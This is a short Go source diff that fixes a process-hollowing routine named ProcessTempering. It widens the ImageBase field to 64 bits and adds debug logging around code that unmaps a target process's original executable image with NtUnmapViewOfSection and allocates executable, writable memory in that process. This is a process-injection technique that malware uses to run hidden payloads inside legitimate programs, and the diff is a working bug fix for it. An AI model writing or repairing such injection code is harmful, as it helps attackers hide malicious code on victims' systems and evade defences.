@@ -105,7 +105,7 @@ type IMAGE_OPTIONAL_HEADER struct {
 	AddressOfEntryPoint         uint32
 	BaseOfCode                  uint32
 	BaseOfData                  uint32
-	ImageBase                   uint32
+	ImageBase                   uint64
 	SectionAlignment            uint32
 	FileAlignment               uint32
 	MajorOperatingSystemVersion uint16
@@ -350,7 +350,8 @@ func ProcessTempering() {
 	}
 
 	// Unmap the original executable image from the target process if its base address matches
-	if uint32(baseAddress) == processNTHeaders.IMAGE_OPTIONAL_HEADER.ImageBase {
+	// Usually not executed
+	if baseAddress == processNTHeaders.IMAGE_OPTIONAL_HEADER.ImageBase {
 		log.Printf("[+] Unmapping the original executable image from the target process: %v\n", baseAddress)
 		if result, _, err := ntDLLNtUnmapViewOfSection.Call(
 			uintptr(processInformation.Process),
@@ -373,6 +374,8 @@ func ProcessTempering() {
 		syscall.PAGE_EXECUTE_READWRITE)
 
 	if (err != nil && err.Error() != "The operation completed successfully.") || int(processMemory) == 0 {
+		log.Printf("[?] ImageBase: 0x%X\n", processNTHeaders.IMAGE_OPTIONAL_HEADER.ImageBase)
+		log.Printf("[?] SizeOfImage: 0x%X\n", processNTHeaders.IMAGE_OPTIONAL_HEADER.SizeOfImage)
 		log.Panicf("[-] Error while allocating virtual memory for the target process: %v\n", err)
 		_ = syscall.TerminateProcess(processInformation.Process, 1)
 		return
